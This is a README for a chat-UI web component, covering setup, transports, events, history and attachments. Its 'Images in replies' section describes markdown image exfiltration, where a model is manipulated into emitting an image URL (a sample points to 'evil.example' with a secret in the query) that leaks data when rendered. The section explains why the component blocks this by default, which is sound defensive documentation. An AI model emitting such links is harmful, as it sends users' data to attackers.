# ai-chat-element

[![npm version](https://img.shields.io/npm/v/ai-chat-element.svg)](https://www.npmjs.com/package/ai-chat-element)
[![bundle size](https://img.shields.io/bundlephobia/minzip/ai-chat-element?label=gzipped)](https://bundlephobia.com/package/ai-chat-element)
[![CI](https://github.com/MahmoudSr/ai-chat-element/actions/workflows/ci.yml/badge.svg)](https://github.com/MahmoudSr/ai-chat-element/actions/workflows/ci.yml)
[![license: MPL-2.0](https://img.shields.io/npm/l/ai-chat-element.svg)](./LICENSE)

A reusable, framework-agnostic **AI chat UI** as a Web Component. Drop `<ai-chat>` into **React, Angular, Vue, Svelte, or plain HTML** — it's a standard custom element, so it works everywhere.

### ▶︎ [Try it in the playground](https://mahmoudsr.github.io/ai-chat-element/examples/playground.html)

Every attribute, all 66 CSS variables, every label and slot — live. Pick a preset,
tweak it, and copy the generated code straight into your app.

- 🎨 **Customizable to the corner** — **66 CSS variables, every one documented**; nothing is hardcoded. One line rebrands it (`--ai-chat-accent`); one knob rounds it (`--ai-chat-radius`); every surface has its own override when you need it.
- 🔌 **Pluggable transport** — built-in adapters for OpenAI-compatible & Anthropic APIs, or bring your own backend
- 🌊 **Streaming** token-by-token with a stop button and jump-to-latest
- 📝 **Markdown + syntax-highlighted code** with copy buttons
- 🧩 **Yours to shape** — 17 slots, 48 `::part()` hooks, sender names, timestamps, avatars, and every string (i18n-ready). No emoji by default.
- ♿ **Accessible** — polite screen-reader announcement of each settled reply
  (no token-by-token spam), a keyboard focus ring, focus that never gets dropped,
  full keyboard support, and respects `prefers-reduced-motion`
- 📦 **~91 KB gzipped**, zero peer dependencies

---

## Install

```bash
npm install ai-chat-element
```

Or use it straight from a CDN with no build step (see [Plain HTML](#plain-html) below).

---

## Quick start

Every use comes down to **two steps**:

1. **Import the package** — this registers the `<ai-chat>` element.
2. **Set a `.transport`** — this tells it which AI to talk to.

The transport is where your app talks to an AI. **The recommended, production-safe
pattern is to point at your own server endpoint**, which holds the API key and
streams text back. The browser never sees the key:

```js
import 'ai-chat-element';                    // 1. register <ai-chat>
import { functionAdapter } from 'ai-chat-element';

const chat = document.querySelector('ai-chat');
chat.transport = functionAdapter(async function* (messages, signal) {
  // Your server holds the API key and streams text back — see "Custom backend".
  const res = await fetch('/api/chat', {
    method: 'POST',
    signal,
    body: JSON.stringify(messages),
  });
  const reader = res.body.getReader();
  const decoder = new TextDecoder();
  for (;;) {
    const { done, value } = await reader.read();
    if (done) break;
    yield decoder.decode(value);             // yield each text chunk
  }
});
```

```html
<ai-chat></ai-chat>
```

> 🔒 **Security: never ship a raw API key in browser code.** Anything in the
> browser is visible to end users — a key placed there can be stolen and abused
> at your expense. Always keep the key on a server you control and have the
> browser talk to _that_. See [Custom backend](#custom-backend) for a complete
> server example.

The built-in `openAIAdapter` / `anthropicAdapter` take an `apiKey` directly. That
is convenient for **local development, internal tools, and talking to a keyless
local server like Ollama** — but for anything users can reach, use the
server-backed pattern above. See [Transports](#transports).

---

## Framework examples

> The examples below set an `apiKey` in the browser to stay short. That's fine for
> **local dev / keyless local servers**, but for anything users can reach, swap
> the adapter for the server-backed `functionAdapter` shown in
> [Quick start](#quick-start) / [Custom backend](#custom-backend). 🔒

### Plain HTML

```html
<!doctype html>
<ai-chat theme="auto" placeholder="Ask me anything…"></ai-chat>

<script type="module">
  // Pin the version so a future release can't change your page unannounced.
  // Drop the @0.3.0 to always get the latest (fine for a quick try, not prod).
  import 'https://esm.sh/ai-chat-element@0.3.0';
  import { openAIAdapter } from 'https://esm.sh/ai-chat-element@0.3.0';

  const chat = document.querySelector('ai-chat');
  // Local, keyless example: talk to Ollama running on your machine.
  // For a hosted app, point at your own server instead (see Custom backend).
  chat.transport = openAIAdapter({
    model: 'llama3.2',
    baseURL: 'http://localhost:11434/v1/chat/completions',
  });
</script>
```

### React

Three things trip people up in React, all shown below: you set **properties**
(like `transport`) in an effect (they're objects, not attributes); you subscribe
to the **custom events** with `addEventListener` (their names contain colons —
`ai-chat:message` — so they can't be `onXxx` props); and on **SSR frameworks**
(Next.js) the import must not run on the server (see the SSR note after this).

```tsx
'use client'; // Next.js app-router: this component must be client-only
import 'ai-chat-element';
import { functionAdapter } from 'ai-chat-element';
import type { AiChat } from 'ai-chat-element';
import { useEffect, useRef } from 'react';

export function Chat() {
  const ref = useRef<AiChat>(null);

  useEffect(() => {
    const el = ref.current;
    if (!el) return;

    // 1. Properties (transport) are set in JS, not as attributes.
    //    Talk to your own /api/chat route so the API key stays on the server.
    el.transport = functionAdapter(async function* (messages, signal) {
      const res = await fetch('/api/chat', { method: 'POST', signal, body: JSON.stringify(messages) });
      const reader = res.body!.getReader();
      const decoder = new TextDecoder();
      for (;;) {
        const { done, value } = await reader.read();
        if (done) break;
        yield decoder.decode(value);
      }
    });

    // 2. Custom events use addEventListener (they aren't onXxx props).
    const onMessage = (e: Event) =>
      console.log((e as CustomEvent).detail.message);
    el.addEventListener('ai-chat:message', onMessage);
    return () => el.removeEventListener('ai-chat:message', onMessage);
  }, []);

  return <ai-chat ref={ref} theme="dark" />;
}
```

For `<ai-chat>` to typecheck in JSX, augment `React.JSX` once (see
[TypeScript](#typescript) for the full snippet).

> **Next.js / SSR — read this.** Importing `'ai-chat-element'` calls
> `customElements.define`, which only exists in the browser — importing it on the
> server throws. Keep it client-only: put `'use client'` at the top of the file
> **and**, in the pages router (or any component that might be server-rendered),
> load it dynamically with SSR disabled:
>
> ```tsx
> import dynamic from 'next/dynamic';
> const Chat = dynamic(() => import('./Chat'), { ssr: false });
> ```

### Vue

Tell the Vue compiler that `<ai-chat>` is a custom element (otherwise it warns
and tries to resolve it as a Vue component). In `vite.config.ts`:

```ts
vue({ template: { compilerOptions: { isCustomElement: (tag) => tag === 'ai-chat' } } });
```

Then:

```vue
<template>
  <ai-chat ref="chat" theme="auto" @ai-chat:message="onMessage" />
</template>

<script setup>
import 'ai-chat-element';
import { openAIAdapter } from 'ai-chat-element';
import { onMounted, ref } from 'vue';

const chat = ref(null);
onMounted(() => {
  chat.value.transport = openAIAdapter({ apiKey: '…', model: 'gpt-4o-mini' });
});
const onMessage = (e) => console.log(e.detail.message);
</script>
```

### Angular

Add `CUSTOM_ELEMENTS_SCHEMA` where the template lives — the standalone component
itself (or the `NgModule` that declares it), not `main.ts`:

```ts
import 'ai-chat-element';
import { openAIAdapter } from 'ai-chat-element';
import { CUSTOM_ELEMENTS_SCHEMA } from '@angular/core';

@Component({
  standalone: true,
  schemas: [CUSTOM_ELEMENTS_SCHEMA], // <- required so Angular allows <ai-chat>
  // Bind the dash form of an event: Angular reads `(ai-chat:message)` as a
  // global target (like `window:resize`) and refuses to compile it.
  template: `<ai-chat #chat theme="light" (ai-chat-message)="onMessage($event)"></ai-chat>`,
})
export class ChatComponent implements AfterViewInit {
  @ViewChild('chat') chat!: ElementRef;
  ngAfterViewInit() {
    this.chat.nativeElement.transport =
      openAIAdapter({ apiKey: '…', model: 'gpt-4o-mini' });
  }
  onMessage(e: Event) { console.log((e as CustomEvent).detail.message); }
}
```

---

## Transports

A **transport** is anything that turns messages into a stream of tokens. Pick a built-in adapter or write your own.

> These two adapters accept an `apiKey` in the browser. Only pass a real key
> here for **local dev, internal tools, or a keyless local server** (Ollama,
> LM Studio). For a hosted app, use the server-backed [Custom backend](#custom-backend)
> pattern so the key never leaves your server. 🔒

### OpenAI-compatible (OpenAI, Ollama, LM Studio, Groq, OpenRouter, vLLM…)

```js
import { openAIAdapter } from 'ai-chat-element';

chat.transport = openAIAdapter({
  model: 'gpt-4o-mini',
  apiKey: '…',                                           // dev/local only — see note above
  baseURL: 'http://localhost:11434/v1/chat/completions', // e.g. local Ollama
  params: { temperature: 0.7 },                          // passed to the API
});
```

### Anthropic

```js
import { anthropicAdapter } from 'ai-chat-element';

chat.transport = anthropicAdapter({
  model: 'claude-sonnet-5',
  apiKey: '…',                // dev/local only — see note above
  maxTokens: 1024,            // Anthropic requires it; defaults to 1024
  params: { temperature: 0.7 },
  headers: {},                // extra request headers, e.g. for a proxy
  browserAccess: true,        // default; opts in to the CORS header needed to
                              // call Anthropic direct from a browser. Ignored
                              // when you route through your own proxy.
});
```

### Custom backend

🔒 **Recommended for production.** **The safe pattern: your server holds the API key** and streams plain text back;
the component just renders it. The browser never sees the key, so it can't be
stolen from your shipped JavaScript.

```js
import { functionAdapter } from 'ai-chat-element';

chat.transport = functionAdapter(async function* (messages, signal) {
  const res = await fetch('/api/chat', {
    method: 'POST',
    signal,
    body: JSON.stringify(messages),
  });
  const reader = res.body.getReader();
  const decoder = new TextDecoder();
  for (;;) {
    const { done, value } = await reader.read();
    if (done) break;
    yield decoder.decode(value); // yield each text chunk
  }
});
```

Your `/api/chat` route is where the real provider call happens. It reads the key
from a server-side environment variable (never bundled into the browser), calls
OpenAI/Anthropic/etc., and streams the text back — for example:

```js
// server-side only (e.g. Next.js route, Express handler) — the key stays here
const upstream = await fetch('https://api.openai.com/v1/chat/completions', {
  method: 'POST',
  headers: {
    'content-type': 'application/json',
    authorization: `Bearer ${process.env.OPENAI_API_KEY}`, // from the server env, not the client
  },
  body: JSON.stringify({ model: 'gpt-4o-mini', stream: true, messages }),
});
// …forward the streamed text down to the browser.
```

---

## Attributes & properties

| Attribute          | Type                        | Default | Description                                                                       |
| ------------------ | --------------------------- | ------- | --------------------------------------------------------------------------------- |
| `theme`            | `auto` \| `light` \| `dark` | `auto`  | Color mode; `auto` follows the OS.                                                |
| `placeholder`      | string                      | `Send a message…` | Input placeholder text.                                                 |
| `empty-heading`    | string                      | —       | Heading shown when there are no messages.                                         |
| `empty-body`       | string                      | —       | Secondary line under the empty heading.                                           |
| `show-names`       | boolean                     | `true`  | Show the sender name above each message.                                          |
| `show-timestamps`  | boolean                     | `true`  | Show a time (e.g. "3:45 PM") next to the name.                                    |
| `assistant-bubble` | boolean                     | `false` | Wrap AI messages in a bubble. Off = borderless plain text (ChatGPT/Claude style). |
| `show-header`      | boolean                     | `false` | Show the built-in header bar (title + new-chat button).                           |
| `show-clear`       | boolean                     | `false` | Show the New/Clear-chat button (in the header, or floating top-right).            |
| `show-retry`       | boolean                     | `true`  | Show a Retry button on a failed message that re-sends the last user turn.         |
| `show-copy`        | boolean                     | `true`  | Show a Copy button in the per-message actions row (both roles).                    |
| `show-edit`        | boolean                     | `false` | Show an Edit button on **user** messages; confirming fires `ai-chat:message-edit`. |
| `show-aside`       | boolean                     | `false` | Show the sidebar column (fill the `aside` slot with your history list).           |
| `aside-side`       | `left` \| `right`           | `left`  | Which side the sidebar sits on.                                                   |
| `system-prompt`    | string                      | —       | Prepended to every request (not shown in UI).                                     |
| `disabled`         | boolean                     | `false` | Disables the input.                                                               |
| `allow-attachments`| boolean                     | `false` | Enable file/image attachments (attach button + drag-drop + paste). See [Attachments](#attachments). |
| `hide-attach-button` | boolean                   | `false` | Keep paste/drop but hide the built-in attach button (bring your own trigger). |
| `accept`           | string                      | `image/*` | Which file types the picker/drop/paste accepts (standard `accept` form). |
| `max-attachments`  | number                      | `5`     | Max attachments per message.                                                      |
| `max-attachment-size` | number (bytes)           | `0`     | Max size per file; `0` = no cap.                                                  |
| `conversation-id`  | string                      | —       | Your key for the conversation on screen. Echoed back on `ai-chat:background-message` so you know which conversation a background reply belongs to. See [Background streaming](#background-streaming). |
| `abort-on-switch`  | boolean                     | `false` | Cancel an in-flight reply when the conversation is switched or cleared, instead of letting it finish in the background. |
| `allow-images`     | boolean                     | `false` | Render images inside replies. Off, an image shows as its alt text and nothing in a reply loads a URL. See [Images in replies](#images-in-replies). |
| `assistant-avatar-src` | string (URL)            | —       | Image for the assistant's avatar on every reply. Wins over the `assistant-avatar` slot. |
| `user-avatar-src`  | string (URL)                | —       | Image for the user's avatar on every user message. Wins over the `user-avatar` slot. |
| `has-earlier`      | boolean                     | `false` | There are older messages than `.messages` holds: shows "Load earlier messages" at the top and fires `ai-chat:load-earlier`. See [Long conversations](#long-conversations-load-earlier). |
| `load-earlier`     | `scroll` \| `button`        | `scroll` | With `has-earlier`: `scroll` loads as the reader nears the top (the button is there too, for keyboard users); `button` loads only on a click. |
| `image-hosts`      | string (space-separated)    | —       | With `allow-images`, the URL prefixes images may load from (e.g. `https://cdn.example.com/`). Only `https:` ever loads. Also settable as an array property `.imageHosts`. |

To turn a boolean attribute off, set it to `"false"` (e.g. `show-timestamps="false"`).

Set via JS only (they hold objects/arrays):

| Property     | Type                  | Description                                        |
| ------------ | --------------------- | -------------------------------------------------- |
| `.transport` | `ChatTransport`       | **Required.** The backend to talk to.              |
| `.messages`  | `ChatMessage[]`       | The conversation (read or seed it).                |
| `.labels`    | `Partial<ChatLabels>` | Override any UI/accessibility strings (see below). |

**Methods:**

| Method                    | Returns              | Notes                                                          |
| ------------------------- | -------------------- | -------------------------------------------------------------- |
| `send(text, attachments?)` | `Promise<boolean>`  | Sends a user turn and streams the reply. Resolves `true` when the turn ran, `false` if it was a no-op (empty text **and** no attachments, or no transport set). Resolves only **after** the stream settles. |
| `retry()`                 | `Promise<boolean>`   | Re-sends the last user turn (e.g. after an error). Same resolution semantics as `send`. |
| `addMessage(role, content)` | `ChatMessage`      | Appends a message to `.messages` **without** sending it — returns the created message (with its generated `id`). Use it to seed history. |
| `stop()`                  | `void`               | Aborts the in-flight stream, if any. Always cancels — unlike a conversation switch, this is the user saying they don't want the reply. |
| `clear()`                 | `void`               | Empties the conversation and the composer draft. An in-flight reply keeps generating in the background (see [Background streaming](#background-streaming)) unless `abort-on-switch` is set. |
| `openFilePicker()`        | `void`               | Opens the native file picker (for use with `hide-attach-button` + your own trigger). No-op unless `allow-attachments` is set. |
| `prependMessages(older)`  | `Promise<void>`      | Adds older messages **above** the conversation — your answer to `ai-chat:load-earlier` — keeping what the reader sees in place. Call it with `[]` when nothing came back (or the load failed) to re-enable the control. |
| `isGenerating(id)`        | `boolean`            | Whether the conversation with that `conversation-id` has a reply still generating in the background. Use it to mark a row in your history list. |

**Events** (all `bubbles: true, composed: true`; read `e.detail`). Each also
fires with a dash instead of the colon — `ai-chat-message`, `ai-chat-new-chat`,
… — same detail; cancelling either cancels both. Use the dash form in
framework templates (Angular can't bind a colon name).

| Event             | `detail`                    | When / notes                                                        |
| ----------------- | --------------------------- | ------------------------------------------------------------------- |
| `ai-chat:submit`  | `{ content: string, attachments: Attachment[] }` | Fires when the user sends, before the request goes out. `attachments` is `[]` unless files were attached. |
| `ai-chat:message` | `{ message: ChatMessage }`  | Once per completed reply — **only when it has content** (empty/failed turns don't fire). The `message` carries `finishReason` / `usage` when reported. |
| `ai-chat:error`   | `{ error: string }`         | Transport failure; `error` is a human-readable message.             |
| `ai-chat:new-chat`| `{ messages: ChatMessage[] }` | Fires when the New-chat button is clicked, **before** clearing. **Cancelable** — call `e.preventDefault()` to keep the current conversation. `messages` is the conversation about to be cleared. |
| `ai-chat:attach`  | `{ attachments: Attachment[] }` | Fires when files are picked/dropped/pasted, after they pass validation. **Cancelable** — `e.preventDefault()` removes them from the tray (you're handling them yourself). Mutate `attachment.url` here to swap in an uploaded URL before send. |
| `ai-chat:attach-rejected` | `{ file: File, reason: 'type' \| 'size' \| 'too-many', message: string }` | Fires when a picked file is rejected by `accept` / `max-attachment-size` / `max-attachments`. |
| `ai-chat:message-edit` | `{ index: number, message: ChatMessage, newContent: string }` | Fires when the user confirms an inline edit (`show-edit`, user messages only). **The component does not change `.messages`** — you decide what edit means. The usual ChatGPT behaviour is to truncate from `index` and resend `newContent`. |
| `ai-chat:preview` | `{ attachment: Attachment }` | Fires when an image (staged in the composer or already sent) is clicked. **Cancelable** — `e.preventDefault()` suppresses the built-in overlay so you can open your own lightbox/gallery. |
| `ai-chat:load-earlier` | `{ conversationId: string \| null, oldest: ChatMessage }` | The reader asked for older messages (`has-earlier`): scrolled near the top, or pressed the button. Fires once until you call `prependMessages()`. `oldest` is your paging cursor. |
| `ai-chat:background-message` | `{ conversationId: string \| null, message: ChatMessage, done: boolean }` | A reply is still streaming for a conversation you've switched away from. Fires per token with `done: false`, then once with `done: true` when it settles (including on error — check `message.error`). `conversationId` is whatever `conversation-id` held when that turn was sent. See [Background streaming](#background-streaming). |

`ai-chat:message` fires once per completed assistant turn — but **only when the
reply has content**. Empty responses and failed turns don't fire it, so if you
persist on this event you won't save blank/ghost messages.

```js
chat.addEventListener('ai-chat:message', (e) => console.log(e.detail.message));
```

### Finish reason & token usage

When the transport reports them, the settled message carries two optional
fields — surfaced identically for OpenAI and Anthropic, so you write one check
regardless of backend:

| Field                  | Type          | Notes                                                        |
| ---------------------- | ------------- | ------------------------------------------------------------ |
| `message.finishReason` | `FinishReason`| Why generation stopped, normalized (see below).              |
| `message.usage`        | `TokenUsage`  | `{ inputTokens?, outputTokens? }` when the provider sends them.|

`FinishReason` is one normalized vocabulary across providers:
`'stop'` (finished naturally), `'length'` (**truncated at the token limit**),
`'content_filter'` (blocked by safety), `'tool_calls'` (stopped to call a tool),
or `'other'`. Both fields are optional — a provider or local server that doesn't
report them (e.g. some Ollama builds) simply leaves them `undefined`.

```js
chat.addEventListener('ai-chat:message', (e) => {
  const { content, finishReason, usage } = e.detail.message;
  if (finishReason === 'length') showBanner('Reply was cut off — hit continue.');
  if (usage) console.log(`${usage.inputTokens} in / ${usage.outputTokens} out`);
});
```

Building a **custom transport**? Attach the same metadata to your `done` chunk
and it flows through unchanged:

```js
yield { type: 'done', finishReason: 'stop', usage: { inputTokens: 12, outputTokens: 34 } };
```

The OpenAI adapter opts into usage reporting for you (it sends
`stream_options: { include_usage: true }`); you don't pass anything.

---

## Names, timestamps & avatars

Above each message the component shows a **sender name** and a **timestamp** — both on by default, both toggleable, and the names are fully customizable.

```html
<!-- Turn either off via the attribute -->
<ai-chat show-timestamps="false"></ai-chat>
```

```js
// Rename the sender labels (defaults are "You" and "AI bot")
chat.labels = { userName: 'You', assistantName: 'Acme Assistant' };
```

**Avatars are opt-in** (no emoji by default). Drop any content into the `assistant-avatar` / `user-avatar` slots — an `<img>`, an inline SVG, initials, or an emoji:

```html
<ai-chat>
  <img slot="assistant-avatar" src="/bot.png" alt="" />
  <span slot="user-avatar">ME</span>
</ai-chat>
```

For a picture, the simplest is a URL — no slot needed:

```html
<ai-chat assistant-avatar-src="/bot.png" user-avatar-src="/me.png"></ai-chat>
```

> **Slotted avatars are cloned.** One slotted node can't appear in every
> message, so each message gets a **copy** inside the shadow DOM — where your
> page's CSS can't reach. Plain `<img>`, initials and self-styled inline SVG
> work; a framework component styled by page CSS (an Angular/React avatar
> component) renders **blank**. Use `assistant-avatar-src` / `user-avatar-src`
> for those, or slot an `<img>` of it. The tile behind the picture is
> `--ai-chat-avatar-bg` (`transparent` for a shaped picture).

Other slots: `send-icon`, `stop-icon`, `jump-icon`, `clear-icon`, `retry-icon`,
`error-icon`, `empty-icon`, `empty` (replace the whole empty state), `header`
(replace the whole top bar), `aside` (the history sidebar), and
`composer-actions-start` / `composer-actions-end` (drop buttons into the input's
action row — see below).

### Message style

By default, **AI messages render as borderless plain text** (ChatGPT/Claude
style) while user messages sit in a bubble. To put the AI messages in a bubble
too, add `assistant-bubble`:

```html
<ai-chat assistant-bubble></ai-chat>
```

---

## Header, new chat & retry

Optional conversation chrome — all off-by-default except retry, all customizable.

```html
<!-- Chat-column header bar with a title -->
<ai-chat show-header></ai-chat>

<!-- New-chat button. With a sidebar it's a full-width button atop the sidebar;
     without one it's a small icon in the header (or floating top-right). -->
<ai-chat show-aside show-clear></ai-chat>
```

The **New-chat button** fires a cancelable **`ai-chat:new-chat`** event (with the
outgoing `messages` so you can save them) and then clears the conversation — see
[Conversation history](#conversation-history-sidebar). Where it appears depends on
layout, matching ChatGPT/Claude:

- **With a sidebar** (`show-aside`): a full-width “+ New chat” button pinned to the
  top of the sidebar.
- **Without a sidebar**: a compact icon button in the header (if `show-header`),
  otherwise floating over the top-right of the messages.

The **header spans the chat column only** — never across the sidebar. Replace it
wholesale with the `header` slot (still inside the shadow DOM, so your theming
applies). Your content keeps the bar's frame — same padding, same bottom divider,
vertically centered — so you only lay out what's inside it:

```html
<ai-chat show-header>
  <div slot="header" style="display:flex;justify-content:space-between">
    <strong>Acme Assistant</strong>
    <select><option>gpt-4o-mini</option></select>
  </div>
</ai-chat>
```

The **Retry button** appears on a failed message and re-sends the last user turn
(also callable as `chat.retry()`); turn it off with `show-retry="false"`.

Rename the built-in strings via `labels`: `headerTitle`, `clearChat`, `retry`.

### Message actions (copy / edit)

Hovering a message reveals an actions row under it. **Copy** is built in and on
by default (both roles); **Edit** is opt-in via `show-edit` and appears on **user
messages only** — you never edit the assistant's words.

```html
<ai-chat show-edit></ai-chat>
```

Editing turns the bubble itself into an input. On confirm the component fires
`ai-chat:message-edit` and **does not touch `.messages`** — the conversation is
your data, so you decide what an edit means. The conventional behaviour (what
ChatGPT/Claude do) is to drop everything from that turn onward and resend:

```js
chat.addEventListener('ai-chat:message-edit', (e) => {
  const { index, newContent } = e.detail;
  chat.messages = chat.messages.slice(0, index); // drop the edited turn + all after
  chat.send(newContent);                          // resend → fresh reply
});
```

Prefer editing in place, or branching the conversation instead? Handle the event
however you like — that's the point of it being a hook rather than a behaviour.

Turn copy off with `show-copy="false"`; restyle both via the `action-button`,
`copy-button` and `edit-button` parts, swap the icons with the `copy-icon` /
`edit-icon` slots, and rename the strings via the `copyMessage`, `edit`,
`saveEdit` and `cancelEdit` labels.

---

## Conversation history (sidebar)

The component renders **one** conversation and, on purpose, does **not** store a
list of past chats or decide where they're saved — that's your app's job (you
already have a database, an account, or `localStorage`). Instead it gives you
exactly what you need to build a ChatGPT-style history yourself:

- **`show-aside`** turns on a sidebar column, and the **`aside` slot** is where
  your conversation list goes. It lives inside the shadow DOM, so your theming
  (CSS variables) applies to it.
- **`ai-chat:new-chat`** fires when the New-chat button is clicked. Its
  `detail.messages` is the outgoing conversation, so you can save it before the
  component clears itself. (Call `preventDefault()` to keep the messages.)
- Switch conversations by setting **`chat.messages = savedConversation`**.

That's the whole pattern — a minimal history in ~20 lines:

```html
<ai-chat id="chat" show-aside>
  <div slot="aside" id="history"></div>
</ai-chat>
```

```js
const list = document.getElementById('history');
const conversations = [{ id: 1, title: 'First chat', messages: [] }];
let activeId = 1;

// Render your own conversation list into the aside slot.
function render() {
  list.innerHTML = '';
  for (const c of conversations) {
    const b = document.createElement('button');
    b.textContent = c.title;
    b.onclick = () => switchTo(c.id);
    list.appendChild(b);
  }
}

// Save the current chat, then let the component start a fresh one.
chat.addEventListener('ai-chat:new-chat', (e) => {
  const current = conversations.find((c) => c.id === activeId);
  if (current) current.messages = e.detail.messages;      // persist however you like
  const id = Date.now();
  conversations.unshift({ id, title: 'New chat', messages: [] });
  activeId = id;
  chat.conversationId = String(id);   // tag it, so a background reply can find its way home
  render();
});

// Click a past conversation to load it.
function switchTo(id) {
  const current = conversations.find((c) => c.id === activeId);
  if (current) current.messages = [...chat.messages];
  activeId = id;
  chat.conversationId = String(id);
  chat.messages = [...conversations.find((c) => c.id === id).messages];
  render();
}

render();
```

See `examples/playground.html` for a complete, working version (with titles
generated from the first message). Use `aside-side="right"` to put it on the
right, and `--ai-chat-aside-width` / `--ai-chat-aside-bg` to size and color it.

---

## Long conversations (load earlier)

For a long conversation, show only the newest messages and load older ones as
the reader scrolls up — the way ChatGPT and Claude do. The component handles the
scrolling and keeps the reader's place; **you** own the storage and the paging,
so it works with any backend.

```js
const chat = document.querySelector('ai-chat');

// Open a conversation with its newest page.
const page = await api.messages(conversationId, { limit: 30 });
chat.conversationId = conversationId;
chat.messages = page.messages;
chat.hasEarlier = page.hasMore;

// The reader scrolled near the top (or pressed "Load earlier messages").
chat.addEventListener('ai-chat:load-earlier', async (e) => {
  try {
    const older = await api.messages(e.detail.conversationId, {
      before: e.detail.oldest.id, // your cursor
      limit: 30,
    });
    await chat.prependMessages(older.messages);
    chat.hasEarlier = older.hasMore;
  } catch {
    await chat.prependMessages([]); // re-enables the control so they can try again
  }
});
```

- **`has-earlier`** turns it on; clear it when you reach the first message.
- **`load-earlier="button"`** loads only when the button is pressed. The default,
  `scroll`, also loads as the reader nears the top — and keeps loading while the
  history is too short to fill the view.
- `ai-chat:load-earlier` fires **once** until you call `prependMessages()`, so a
  fast scroll never sends duplicate requests. If the conversation on screen
  changes (`conversation-id` or `.messages`) before you answer, the pending load
  is dropped.
- Message `id`s must be unique: the list is keyed by them, so existing messages
  keep their DOM when older ones are added above.
- Style it with `::part(load-earlier)` (the button) and `::part(load-earlier-row)`;
  translate it with the `loadEarlier` / `loadingEarlier` labels.

## Background streaming

Switching conversations while the AI is still answering does **not** cancel the
answer — same as ChatGPT and Claude. The request keeps running, and **switching
back shows it still streaming**, tokens arriving live, as if you'd never left.

All you have to do is tell the component which conversation is on screen, by
setting `conversation-id` whenever you swap `.messages`:

```js
function switchTo(id) {
  chat.conversationId = id;             // ← the one line that makes this work
  chat.messages = load(id);
}
```

That's it. If `id` has a reply in flight, the component re-attaches it and keeps
rendering into the chat; the Stop button comes back too, so the user can
interrupt it now that they can see it.

To **persist** a reply that finishes while the user is elsewhere, listen for
`ai-chat:background-message`:

```js
chat.addEventListener('ai-chat:background-message', (e) => {
  const { conversationId, message, done } = e.detail;
  if (!done) return;                    // per-token progress; ignore for storage
  save(conversationId, message);        // the finished reply (check message.error)
});
```

Use `chat.isGenerating(id)` to mark a row in your history list as still working —
the playground shows a small pulsing dot. Update that marker **in place** on the
per-token events; don't rebuild the list DOM per token, or a token landing
between mousedown and mouseup replaces the row under the cursor and the click is
lost (the playground's `syncDots()` shows the pattern).

Details worth knowing:

- **`conversationId` is the id that was active when that turn was *sent***, not
  the one on screen now — that's what makes it usable as a storage key.
- The event fires **only** for replies whose conversation you left. A reply in
  the conversation you're looking at settles normally via `ai-chat:message`.
- **Errors still settle**: a background stream that fails fires `done: true` with
  `message.error` set. It does *not* fire `ai-chat:error`, since there's no
  visible conversation for that error to belong to.
- **`stop()` always cancels** (so do the Stop button and <kbd>Esc</kbd>). Only an
  implicit switch or `clear()` detaches — pressing Stop means you don't want the
  reply at all, and it cancels a background reply too when you're viewing it.
- **New-chat drops the id.** `clear()` starts a genuinely new conversation, so it
  clears `conversationId` rather than letting the empty chat adopt the outgoing
  conversation's stream. Assign your own id on `ai-chat:new-chat`.
- **Removing the element cancels everything.** Detached streams are aborted on
  disconnect, so a background reply never outlives the component.
- The component still owns exactly **one visible conversation** — you own history
  and storage, as always. It holds a background reply only until it settles.

To get the old behavior — cancel the request the moment you switch away — set
`abort-on-switch`:

```html
<ai-chat abort-on-switch></ai-chat>
```

---

## The composer (input box)

The composer is one rounded box: the textarea on top, and a **bottom action row**
with the send button on the right. Two slots let you add your own buttons to that
row — for attachments, a mic, text-to-speech, anything — with no layout work:

```html
<ai-chat>
  <!-- left side of the action row -->
  <button slot="composer-actions-start" title="Attach">📎</button>
  <!-- right side, before the send button -->
  <button slot="composer-actions-end" title="Voice">🎤</button>
</ai-chat>
```

The input grows with its content up to `--ai-chat-input-max-height` (default
200px), then scrolls internally. Style the box via the `composer-box` part and
the row via `composer-actions` / `composer-actions-start` / `composer-actions-end`.

**Keyboard:** **Enter** sends, **Shift+Enter** inserts a newline, and **Esc**
stops an in-flight response (same as the stop button; works from anywhere inside
the widget).

---

## Attachments

Off by default. Add `allow-attachments` and you get a built-in attach button in
the composer, plus **drag-drop** and **paste** (paste a screenshot straight into
the input) — all three funnel through the same pipeline:

```html
<ai-chat allow-attachments accept="image/*"></ai-chat>
```

That's the whole zero-code path: **images are sent to the built-in OpenAI /
Anthropic adapters automatically** (as the provider's native image format), so an
image + a question just works with no server.

Configure it:

| Attribute             | Default   | What it does                                   |
| --------------------- | --------- | ---------------------------------------------- |
| `allow-attachments`   | `false`   | Turns the feature on (button + paste + drag).  |
| `hide-attach-button`  | `false`   | Keep paste + drag but hide the built-in button (see below). |
| `accept`              | `image/*` | Allowed file types (standard `accept` syntax: `image/*`, `.pdf`, `image/png,application/pdf`, `*`). |
| `max-attachments`     | `5`       | Max files per message.                         |
| `max-attachment-size` | `0`       | Max bytes per file (`0` = no cap).             |

### Images in replies

A reply is model output, and a model can be talked into writing anything —
including an image whose URL carries data out of the page the moment it shows
(`![](https://evil.example/?d=<secret>)`, "markdown image exfiltration"). So by
default **nothing in a rendered message loads a URL by itself**: images show as
their alt text, and `style` attributes and tags, `srcset`, media, SVG images and
image inputs are stripped. Links get `rel="noopener noreferrer"`.

If your replies genuinely need pictures, opt in and allowlist where they may
come from:

```html
<ai-chat allow-images image-hosts="https://cdn.example.com/ https://images.example.org/assets/"></ai-chat>
```

Only `https:` URLs that start with one of the prefixes load, and they load with
`referrerpolicy="no-referrer"`. `allow-images` without `image-hosts` allows any
`https:` image — only do that if you trust everything your model reads.

### Paste/drag without the button

`allow-attachments` gives you the attach button **and** paste/drag together. If
you want paste-a-screenshot and drag-drop but **not** the built-in button — say
you're providing your own trigger — add `hide-attach-button`:

```html
<ai-chat allow-attachments hide-attach-button></ai-chat>
```

Paste and drag keep working; the button is gone. To open the picker from your own
button, call `chat.openFilePicker()` (e.g. from a button you slot into
`composer-actions-start`).

### What reaches the AI

The UI accepts **whatever `accept` allows**, but only **images** are auto-sent to
the built-in adapters — the OpenAI/Anthropic *streaming chat* APIs accept images
directly, but have no standard slot for a PDF or other document. Non-image files
still render in the UI and reach your code via `ai-chat:submit` (with the raw
`File` on each attachment), so if you run **your own backend** (via
`functionAdapter`) you can process a PDF there — exactly how Claude.ai does it
(its server extracts the document before the model sees it).

### Uploading to your own storage

By default attachments are inline `data:` URLs — fine for images going straight
to a model. If you'd rather upload files to storage and send a URL instead, listen
for the cancelable **`ai-chat:attach`** event, upload, and swap the `url`:

```js
chat.addEventListener('ai-chat:attach', async (e) => {
